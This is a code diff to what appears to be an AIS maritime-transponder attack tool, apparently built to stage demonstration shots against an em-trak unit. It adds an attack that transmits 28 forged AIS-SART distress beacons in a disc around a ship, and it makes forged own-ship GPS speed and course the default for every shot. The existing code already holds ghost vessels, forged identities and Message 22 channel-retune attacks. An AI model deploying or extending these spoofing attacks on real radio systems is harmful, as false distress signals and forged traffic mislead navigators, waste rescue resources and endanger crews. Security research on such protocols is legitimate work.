@@ -147,6 +147,20 @@ def star_outline(vlat, vlon, radius_m, points=5, inner_ratio=0.4, per_edge=4):
     return pts
 
 
+def disc_fill(vlat, vlon, radius_m, n=28):
+    """lat/lon points evenly filling a DISC of radius_m around (vlat,vlon), via a phyllotaxis
+    (sunflower) spiral: r = radius*sqrt(i/n), theta = i*golden_angle. This spreads n points
+    uniformly over the whole circle, so they read as a solid filled disc on the chart rather
+    than a ring or a clump. Small n keeps each target re-reporting often so they establish fast."""
+    golden = 137.508  # degrees
+    pts = []
+    for i in range(n):
+        r = radius_m * math.sqrt((i + 0.5) / n)
+        bearing = (i * golden) % 360.0
+        pts.append(offset_position(vlat, vlon, bearing, r))
+    return pts
+
+
 # ----------------------------------------------------------------------------
 # The attack timeline. Each entry: (name, builder) where builder(ctx) -> list of
 # (payload_bits, meta). ctx gives access to the live victim position + config.
@@ -973,6 +987,15 @@ def build_photos(ctx, photo_lat=None, photo_lon=None, photo_range=1000.0, star_p
                  star_outline(vlat, vlon, r, points=star_points, inner_ratio=0.4, per_edge=2))],
             f"STAR: ghost vessels tracing a {star_points}-point star around own ship "
             f"(radius {int(r)} m ~ {r/1852:.2f} NM; set the display range to about twice that)"),
+        # a swarm of active AIS-SARTs evenly filling a disc around own ship -- every one a distinct
+        # 970 identity with distress status, so em-trak paints a solid circle of distress icons.
+        "sart_circle": ("loop",
+            [(enc.encode_type1(970200000 + i, la, lo, sog=0.0, nav_status=14,
+                               timestamp=time.gmtime().tm_sec),
+              f"SART {i}")
+             for i, (la, lo) in enumerate(disc_fill(vlat, vlon, r, n=28))],
+            f"SART CIRCLE: 28 active AIS-SARTs filling a disc around own ship "
+            f"(radius {int(r)} m ~ {r/1852:.2f} NM; set the display range to about twice that)"),
         "m22_channel": ("hold",
             [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
                   f"M22 retune to {ALT_CH_A}/{ALT_CH_B}")],
@@ -1153,7 +1176,7 @@ def main():
                     help="seconds to hold the far position so the unit runs its regional-area "
                          "housekeeping and deletes the out-of-range area")
     ap.add_argument("--photo", choices=["impossible_speed", "forged_identity", "ghost_vessel",
-                                        "sart_distress", "duplicate_mmsi", "star",
+                                        "sart_distress", "sart_circle", "duplicate_mmsi", "star",
                                         "m22_channel", "m22_power"],
                     help="hold ONE shot for the camera (Ctrl-C to stop, restart for the next). "
                          "The target shots (ghost/speed/identity/distress/duplicate) loop forever so "
@@ -1173,7 +1196,11 @@ def main():
                     help="drive the UNIT'S OWN reported speed via its GPS feed to this many knots, so "
                          "the transponder itself reports an impossible speed while parked. Max useful "
                          "~102.2 kn (AIS SOG saturates there). Combine with --photo impossible_speed "
-                         "to put both a ghost and the own ship at impossible speed in one frame.")
+                         "to put both a ghost and the own ship at impossible speed in one frame. "
+                         "Defaults to 102.2 kn for any --photo; pass 0 to park own ship.")
+    ap.add_argument("--photo-own-course", type=float, default=None,
+                    help="own-ship COG (degrees) driven over the GPS feed during a photo so the COG "
+                         "field is not blank. Defaults to 279 for any --photo.")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -1284,11 +1311,20 @@ def main():
                                   args.photo_star_points)
             kind, payloads, banner = photos[args.photo]
             rec(event="photo_start", name=args.photo, kind=kind)
-            if args.photo_own_speed is not None:
-                gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=args.photo_own_speed)
-                rec(event="photo_own_speed", speed=args.photo_own_speed)
-                print(f"  own-ship GPS feed set to {args.photo_own_speed} kn -- the unit itself now "
-                      f"reports impossible speed while parked")
+            # Drive own-ship's OWN reported state (SOG + COG) over the GPS feed for EVERY photo so
+            # those fields fill in the shot instead of reading blank. Defaults are dramatic: an
+            # impossible speed (102.2 kn = the AIS SOG saturation) and a real course, so the unit
+            # shows itself doing something no real vessel can. Own position is whatever --lat/--lon
+            # set (pass Everest there to park own ship on the summit). Override or zero with the flags.
+            own_speed = args.photo_own_speed if args.photo_own_speed is not None else 102.2
+            own_course = args.photo_own_course if args.photo_own_course is not None else 279.0
+            gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=own_speed, course=own_course)
+            rec(event="photo_own_state", speed=own_speed, course=own_course,
+                lat=ctx.victim_lat, lon=ctx.victim_lon)
+            print(f"  own-ship GPS feed: {own_speed:.1f} kn, COG {own_course:.0f} deg @ "
+                  f"{ctx.victim_lat:.4f},{ctx.victim_lon:.4f} -- SOG/COG/position all populated "
+                  f"({'impossible speed' if own_speed > 60 else 'set speed'}; "
+                  f"--photo-own-speed 0 for a stationary own ship)")
             # space messages when there are many, so a large set (e.g. the star's ~40 vessels) does
             # not transmit on top of itself and collide on air -- 0.1 s is ~4 TDMA slots apart.
             _gap = 0.1 if len(payloads) > 4 else 0.0
